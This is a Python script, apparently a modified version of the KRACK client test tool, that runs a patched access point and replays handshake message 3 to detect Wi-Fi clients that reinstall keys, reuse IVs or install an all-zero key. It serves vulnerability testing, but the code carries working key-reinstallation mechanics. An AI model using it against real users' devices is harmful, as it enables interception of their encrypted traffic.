#!/usr/bin/env python3

# Tests for key reinstallation vulnerabilities in Wi-Fi clients
# Copyright (c) 2017-2021, Mathy Vanhoef <Mathy.Vanhoef@cs.kuleuven.be>
#
# This code may be distributed under the terms of the BSD license.
# See README for more details.

# This script is a MODIFIED version of the original script, called krack-test-client.py and hosted on the GitHub repository https://github.com/vanhoefm/krackattacks-scripts. It is released under the condition of the BSD license.
# Modified date: April 22, 2026
# Changes: Simplified script in order for it to perform only the client test. Added option to ignore zero key reinstallation

import logging
from scapy.all import * #packet manipulation lib
import libwifi
from libwifi import *
import sys, socket, struct, time, subprocess, atexit, select, os.path
from wpaspy import Ctrl

warned_hardware_decryption = False

# After how many seconds a new message 3
HANDSHAKE_TRANSMIT_INTERVAL = 5

#### Utility Commands ####

def hostapd_clear_messages(hostapd_ctrl):
	# Clear old replies and messages from the hostapd control interface
	while hostapd_ctrl.pending():
		hostapd_ctrl.recv()

def hostapd_command(hostapd_ctrl, cmd):
	hostapd_clear_messages(hostapd_ctrl)
	rval = hostapd_ctrl.request(cmd)
	if "UNKNOWN COMMAND" in rval:
		log(ERROR, "Hostapd did not recognize the command %s. Did you (re)compile hostapd?" % cmd.split()[0])
		quit(1)
	elif "FAIL" in rval:
		log(ERROR, "Failed to execute command %s" % cmd)
		quit(1)
	return rval

#### Main Testing Code ####

class TestOptions():
	Fourway = range(1)
	TptkNone = range(1)
	IgnoreAllZeroKey = range(1)

	def __init__(self, variant=Fourway):
		self.variant = variant

		self.tptk = TestOptions.TptkNone
		self.ignoreAllZeroKey = False

class ClientState():
	UNKNOWN, VULNERABLE, PATCHED = range(3)
	IDLE, STARTED, GOT_CANARY, FINISHED = range(4)

	def __init__(self, clientmac, options):
		self.mac = clientmac
		self.options = options
		self.TK = None
		self.vuln_4way = ClientState.UNKNOWN
		self.vuln_bcast = ClientState.UNKNOWN

		self.ivs = IvCollection()
		self.pairkey_sent_time_prev_iv = None
		self.pairkey_intervals_no_iv_reuse = 0

		self.broadcast_reset()

	def broadcast_reset(self):
		self.broadcast_state = ClientState.IDLE
		self.broadcast_prev_canary_time = 0
		self.broadcast_num_canaries_received = -1 # -1 because the first broadcast ARP requests are still valid
		self.broadcast_requests_sent = -1 # -1 because the first broadcast ARP requests are still valid
		self.broadcast_patched_intervals = 0

	def get_encryption_key(self, hostapd_ctrl):
		'''Self-explanatory: get the Temporal Key used by hostapd to encrypt and decrypt packets'''
		if self.TK is None:
			# Contact our modified Hostapd instance to request the pairwise key
			response = hostapd_command(hostapd_ctrl, "GET_TK " + self.mac)
			if not "FAIL" in response:
				self.TK = bytes.fromhex(response.strip())
		return self.TK

	def decrypt(self, p, hostapd_ctrl):
		payload = get_ccmp_payload(p)

		if payload.startswith(b"\xAA\xAA\x03\x00\x00\x00"):
			# On some kernels, the virtual interface associated to the real AP interface will return
			# frames where the payload is already decrypted (this happens when hardware decryption is
			# used). So if the payload seems decrypted, just extract the full plaintext from the frame.
			plaintext = LLC(payload)
		else:
			key       = self.get_encryption_key(hostapd_ctrl)
			plaintext = decrypt_ccmp(p, key)

			# If it still fails, try an all-zero key
			if plaintext == None:
				plaintext = decrypt_ccmp(p, b"\x00" * 16)

			# No need for the whole packet, just the plaintext payload
			if plaintext != None:
				plaintext = plaintext[LLC]

		return plaintext

	def track_used_iv(self, p):
		return self.ivs.track_used_iv(p)

	def is_iv_reused(self, p):
		return self.ivs.is_iv_reused(p)

	def check_pairwise_reinstall(self, p):
		"""Inspect whether the IV is reused, or whether the client seem to be patched"""
		# If this is gaurenteed IV reuse (and not just a benign retransmission), mark the client as vulnerable
		if self.ivs.is_iv_reused(p):
			if self.vuln_4way != ClientState.VULNERABLE:
				iv = dot11_get_iv(p)
				seq = dot11_get_seqnum(p)
				log(WARNING, ("%s: IV reuse detected (IV=%d, seq=%d). " +
					"Client reinstalls the pairwise key in the 4-way handshake (this is bad)") % (self.mac, iv, seq))
			self.vuln_4way = ClientState.VULNERABLE

		# If it's a higher IV than all previous ones, try to check if the client seems patched
		elif self.vuln_4way == ClientState.UNKNOWN and self.ivs.is_new_iv(p):
			# Save how many intervals we received a data packet without IV reset. Use twice the
			# transmission interval of message 3, in case one message 3 is lost due to noise.
			if self.pairkey_sent_time_prev_iv is None:
				self.pairkey_sent_time_prev_iv = p.time
			elif self.pairkey_sent_time_prev_iv + 2 * HANDSHAKE_TRANSMIT_INTERVAL + 1 <= p.time:
				self.pairkey_intervals_no_iv_reuse += 1
				self.pairkey_sent_time_prev_iv = p.time
				log(DEBUG, "%s: no pairwise IV resets seem to have occured for one interval" % self.mac)

			# If during several intervals all IV reset attempts failed, the client is likely patched.
			# We wait for enough such intervals to occur, to avoid getting a wrong result.
			if self.pairkey_intervals_no_iv_reuse >= 5 and self.vuln_4way == ClientState.UNKNOWN:
				self.vuln_4way = ClientState.PATCHED

				# Be sure to clarify *which* type of attack failed (to remind user to test others attacks as well)
				msg = "%s: client DOESN'T reinstall the pairwise key in the 4-way handshake (this is good)"
				if self.options.tptk == TestOptions.TptkNone:
					msg += " (used standard attack)"
				log(INFO, (msg + ".") % self.mac, color="green")

	def mark_allzero_key(self, p):
		if self.vuln_4way != ClientState.VULNERABLE:
			iv = dot11_get_iv(p)
			seq = dot11_get_seqnum(p)
			log(WARNING, ("%s: usage of all-zero key detected (IV=%d, seq=%d). " +
				"Client (re)installs an all-zero key in the 4-way handshake (this is very bad).") % (self.mac, iv, seq))
			log(WARNING, "%s: !!! Other tests are unreliable due to all-zero key usage, please fix this vulnerability first !!!" % self.mac, color="red")
		self.vuln_4way = ClientState.VULNERABLE

	def broadcast_print_vulnerable(self):
		if self.options.variant in [TestOptions.Fourway]:
			hstype = "4-way"

	def broadcast_process_reply(self, p):
		"""Handle replies to the replayed ARP broadcast request (which reuses an IV): basically, the function that call this function reply to the arp first, and analyze the request received after to look for reused iv."""

		# Must be testing this client, and must not be a benign retransmission
		if not self.broadcast_state in [ClientState.STARTED, ClientState.GOT_CANARY]: return
		if self.broadcast_prev_canary_time + 1 > p.time: return

		self.broadcast_num_canaries_received += 1
		log(DEBUG, "%s: received %d replies to the replayed broadcast ARP requests" % (self.mac, self.broadcast_num_canaries_received))

		# We wait for several replies before marking the client as vulnerable, because
		# the first few broadcast ARP requests still use a valid (not yet used) IV.
		if self.broadcast_num_canaries_received >= 5:
			assert self.vuln_bcast != ClientState.VULNERABLE
			self.vuln_bcast = ClientState.VULNERABLE
			self.broadcast_state = ClientState.FINISHED
			self.broadcast_print_vulnerable()
		else:
			self.broadcast_state = ClientState.GOT_CANARY

		self.broadcast_prev_canary_time = p.time

class KRAckAttackClient():
	def __init__(self):
		# Parse hostapd.conf
		self.script_path = os.path.dirname(os.path.realpath(__file__))
		try:
			interface = hostapd_read_config(os.path.join(self.script_path, "hostapd.conf"))
		except Exception as ex:
			log(ERROR, "Failed to parse the hostapd.conf config file")
			raise
		if not interface:
			log(ERROR, 'Failed to determine wireless interface. Specify one in hostapd.conf at the line "interface=NAME".')
			quit(1)

		# Set other variables
		self.nic_iface = interface
		self.nic_mon = ("mon" + interface)[:15]
		self.options = None
		try:
			self.apmac = scapy.arch.get_if_hwaddr(interface)
		except:
			log(ERROR, 'Failed to get MAC address of %s. Specify an existing interface in hostapd.conf at the line "interface=NAME".' % interface)
			raise

		self.sock_mon = None
		self.sock_eth = None
		self.hostapd = None
		self.hostapd_ctrl = None

		self.dhcp = None
		self.broadcast_sender_ip = None
		self.broadcast_arp_sock = None

		self.clients = dict()

	def reset_client_info(self, clientmac): #SEARCH
		if clientmac in self.dhcp.leases:
			self.dhcp.remove_client(clientmac)
			log(DEBUG, "%s: Removing client from DHCP leases" % clientmac)
		if clientmac in self.clients:
			del self.clients[clientmac]
			log(DEBUG, "%s: Removing ClientState object" % clientmac)

	def handle_replay(self, p):
		"""p=packet. Replayed frames (caused by a pairwise key reinstallation) are rejected by the kernel. This
		function processes these frames manually so we can still test reinstallations of the group key."""
		if not dot11_is_encrypted_data(p):
			log(WARNING, "Detected UNENCRYPTED 802.11 frame");			
			return

		# Reconstruct Ethernet header
		clientmac = p.addr2
		header = Ether(dst=self.apmac, src=clientmac)
		header.time = p.time #Not part of ethernet frame, scapy required

		# Decrypt the Wi-Fi frame
		client = self.clients[clientmac]
		plaintext = client.decrypt(p, self.hostapd_ctrl)
		if plaintext == None:
			return
		if not SNAP in plaintext:
			#SNAP is part of 802.2 protocol. It manage multiplexing. Here the script search for its header
			log(WARNING, "No SNAP layer in decrypted packet {}".format(plaintext))
			return None

		# Now process the packet as if it were a valid (non-replayed) one
		decap = header/plaintext[SNAP].payload
		self.process_eth_rx(decap)

	def handle_mon_rx(self):
		'''Handle packets received on the ap monitor interface. Mon stands for monitor and it is setted up by this script on the interface provided in the hostapd confg'''
		p = self.sock_mon.recv() #Take the received packet
		if p == None: return
		if p.type == 1: return #1 is a control frame but only data frames (2) and management frames (0) are of interest

		# The first bit in FCfield is set if the frames is "to-DS" (to DS means to the Distribution system aka the distribution network aka the wired network in 802.11 standard)
		clientmac, apmac = (p.addr1, p.addr2) if (p.FCfield & 2) != 0 else (p.addr2, p.addr1)
		if apmac != self.apmac: return None

		# Reset info about disconnected clients (Dot11 = 802.11 standard)
		if Dot11AssoReq in p or Dot11Deauth in p or Dot11Disas in p:
			self.reset_client_info(clientmac)

		# Inspect encrypt frames for IV reuse (only for frames directed to the AP) & handle replayed frames rejected by the kernel
		elif p.addr1 == self.apmac and dot11_is_encrypted_data(p):

			if not clientmac in self.clients:
				self.clients[clientmac] = ClientState(clientmac, options=options) #Add client to list if it was firt message
			client = self.clients[clientmac] #recover current client

			iv = dot11_get_iv(p)
			log(DEBUG, "%s: transmitted data using IV=%d (seq=%d)" % (clientmac, iv, dot11_get_seqnum(p)))
			
 			#Detect if all-0 key was used (very bad, wpa_supplicant 2.5 and 2.4 behavior). To detect, it just try to decrypt with an all-0 key
			if self.options.ignoreAllZeroKey == False and decrypt_ccmp(p, b"\x00" * 16) != None:
				client.mark_allzero_key(p)
			if self.options.variant == TestOptions.Fourway: #4 way is default if no option is provided
				client.check_pairwise_reinstall(p)
			if client.is_iv_reused(p): #Handle manually packets in case it had an already used iv (because some kernels reject in this case. Check function handle_replay for more info).
				self.handle_replay(p)
			client.track_used_iv(p)

	def process_eth_rx(self, p):
		'''Process packages received by normal interface. ARP and DHCP packet arrive here, so this function manage the reply.'''
		self.dhcp.reply(p) #reply to dhcp. dhcp is a DHCP_sock. Not really publicly documented.
		self.broadcast_arp_sock.reply(p) #similar to the dhcp method, but for ARP. broadcast_arp_sock is a ARP_sock of scapy.

		clientmac = p[Ether].src
		if not clientmac in self.clients: return #Ignore packages of non-client
		client = self.clients[clientmac]

		if ARP in p and p[ARP].pdst == self.broadcast_sender_ip:
			client.broadcast_process_reply(p) #Check the received arp packet

	def handle_eth_rx(self):
		'''Handle receive of a new packet on the normal interface configured in hostapd. ARP and DHCP packet arrive here.'''
		p = self.sock_eth.recv()
		if p == None or not Ether in p: return
		self.process_eth_rx(p)

	def configure_interfaces(self):
		log(STATUS, "Note: disable Wi-Fi in network manager & disable hardware encryption. Both may interfere with this script.")

		# 0. Some users may forget this otherwise
		subprocess.check_output(["rfkill", "unblock", "wifi"])

		# 1. Remove unused virtual interfaces to start from a clean state
		subprocess.call(["iw", self.nic_mon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

		# 2. Configure monitor mode on interfaces
		subprocess.check_output(["iw", self.nic_iface, "interface", "add", self.nic_mon, "type", "monitor"])
		# Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
		# sequence of commands assures the virtual interface is properly registered as a 802.11 monitor interface.
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		time.sleep(0.5)
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		subprocess.check_output(["ifconfig", self.nic_mon, "up"])

	def run(self, options):
		self.options = options
		self.configure_interfaces()

		# Open the patched hostapd instance that carries out tests and let it start
		log(STATUS, "Starting hostapd ...")
		try:
			self.hostapd = subprocess.Popen([
				os.path.join(self.script_path, "../hostapd/hostapd"),
				os.path.join(self.script_path, "hostapd.conf")]
				+ sys.argv[1:])
		except:
			if not os.path.exists("../hostapd/hostapd"):
				log(ERROR, "hostapd executable not found. Did you compile hostapd? Use --help param for more info.")
			raise
		time.sleep(1)

		try:
			self.hostapd_ctrl = Ctrl("hostapd_ctrl/" + self.nic_iface)
			self.hostapd_ctrl.attach()
		except:
			log(ERROR, "It seems hostapd did not start properly, please inspect its output.")
			log(ERROR, "Did you disable Wi-Fi in the network manager? Otherwise hostapd won't work.")
			raise

		self.sock_mon = MonitorSocket(type=ETH_P_ALL, iface=self.nic_mon) #setted by script. Monitor interface of the ap
		self.sock_eth = L2Socket(type=ETH_P_ALL, iface=self.nic_iface) #normal wlan interface

		self.dhcp = DHCP_sock(sock=self.sock_eth,
						domain='krackattack.com',
						pool=Net('192.168.100.0/24'),
						network='192.168.100.0/24',
						gw='192.168.100.254',
						renewal_time=600, lease_time=3600)		

		# Configure gateway IP: reply to ARP and ping requests
		subprocess.check_output(["ifconfig", self.nic_iface, "192.168.100.254"])

		# Use a dedicated IP address for our broadcast ARP requests and replies
		self.broadcast_sender_ip = "192.168.100.254/24"
		self.broadcast_arp_sock = ARP_sock(sock=self.sock_eth, IP_addr=self.broadcast_sender_ip, ARP_addr=self.apmac)

		log(STATUS, "Ready. Connect to this Access Point to start the tests. Make sure the client requests an IP using DHCP!", color="green")

		# Monitor both the normal interface and virtual monitor interface of the AP
		self.next_arp = time.time() + 1
		while True:
			sel = select.select([self.sock_mon, self.sock_eth], [], [], 1)
			if self.sock_mon in sel[0]: self.handle_mon_rx() #Handle monitor interface of ap
			if self.sock_eth in sel[0]: self.handle_eth_rx() #Handle normal wlan interface

			# Replay message main cycle: replay the msg 3 every HANDSHAKE_TRANSMIT_INTERVAL seconds
			if time.time() > self.next_arp:
				# When testing if the replay counter of the group key is properly installed, always install
				# a new group key. Otherwise KRACK patches might interfere with this test.
				# Otherwise just reset the replay counter of the current group key.
				hostapd_command(self.hostapd_ctrl, "RESET_PN FF:FF:FF:FF:FF:FF")

				self.next_arp = time.time() + HANDSHAKE_TRANSMIT_INTERVAL
				for client in self.clients.values():
					if self.options.variant == TestOptions.Fourway and client.vuln_bcast != ClientState.VULNERABLE: #Block testing if client was found vulnerable
						# Note that we rely on an encrypted message 4 as reply to detect pairwise key reinstallations reinstallations.
						hostapd_command(self.hostapd_ctrl, "RESEND_M3 " + client.mac)

	def stop(self):
		log(STATUS, "Closing hostapd and cleaning up ...")
		if self.hostapd:
			self.hostapd.terminate()
			self.hostapd.wait()
		if self.sock_mon: self.sock_mon.close()
		if self.sock_eth: self.sock_eth.close()


def cleanup():
	attack.stop()

def argv_get_interface():
	for i in range(len(sys.argv)):
		if not sys.argv[i].startswith("-i"):
			continue
		if len(sys.argv[i]) > 2:
			return sys.argv[i][2:]
		else:
			return sys.argv[i + 1]

	return None

def argv_pop_argument(argument):
	if not argument in sys.argv: return False
	idx = sys.argv.index(argument)
	del sys.argv[idx]
	return True

def hostapd_read_config(config):
	# Read the config, get the interface name, and verify some settings.
	interface = None
	with open(config) as fp:
		for line in fp.readlines():
			line = line.strip()
			if line.startswith("interface="):
				interface = line.split('=')[1]
			elif line.startswith("wpa_pairwise=") or line.startswith("rsn_pairwise"):
				if "TKIP" in line:
					log(ERROR, "ERROR: We only support tests using CCMP. Only include CCMP in %s config at the following line:" % config)
					log(ERROR, "       >%s<" % line, showtime=False)
					quit(1)

	# Parameter -i overrides interface in config.
	# FIXME: Display warning when multiple interfaces are used.
	if argv_get_interface() is not None:
		interface = argv_get_interface()

	return interface

def get_expected_scapy_ver():
	for line in open("requirements.txt"):
		if line.startswith("scapy=="):
			return line[7:].strip()
	return None

if __name__ == "__main__":
	if "--help" in sys.argv or "-h" in sys.argv:
		print("\nSee README.md for usage instructions. Accepted parameters are")
		print("\n\t" + "\n\t".join(["--ignore-all-zero-key --debug"]) + "\n")
		quit(1)

	# Check if we're using the expected scapy version
	expected_ver = get_expected_scapy_ver()
	if expected_ver!= None and scapy.VERSION != expected_ver:
		log(WARNING, "You are using scapy version {} instead of the expected {}".format(scapy.VERSION, expected_ver))
		log(WARNING, "Are you executing the script from inside the correct python virtual environment?")

	options = TestOptions()

	# Parse the type of test variant to execute
	options.variant = TestOptions.Fourway

	options.tptk = TestOptions.TptkNone

	ignoreAllZeroKey = argv_pop_argument("--ignore-all-zero-key")
	if ignoreAllZeroKey:
		options.ignoreAllZeroKey = TestOptions.IgnoreAllZeroKey

	# Parse remaining options
	while argv_pop_argument("--debug"):
		change_log_level(-1)

	# Now start the tests
	attack = KRAckAttackClient()
	atexit.register(cleanup)
	attack.run(options=options)